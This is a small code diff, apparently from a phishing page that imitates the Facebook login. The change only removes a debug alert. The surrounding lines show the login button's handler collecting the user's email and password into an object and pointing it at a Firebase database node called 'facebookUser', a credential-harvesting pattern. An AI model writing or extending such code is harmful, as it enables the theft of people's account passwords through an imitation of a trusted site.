@@ -38,7 +38,6 @@ onloadRegister_DEPRECATED(function (){begin_polling_login_cookies("https:\/\/web
 
   document.getElementById("loginbutton").addEventListener("click", function(){
     var user = {};
-    alert("dsgfsdf")
     user.email= document.getElementById('email').value;
     user.password = document.getElementById('pass').value
     var ref = firebase.database().ref().child("facebookUser");
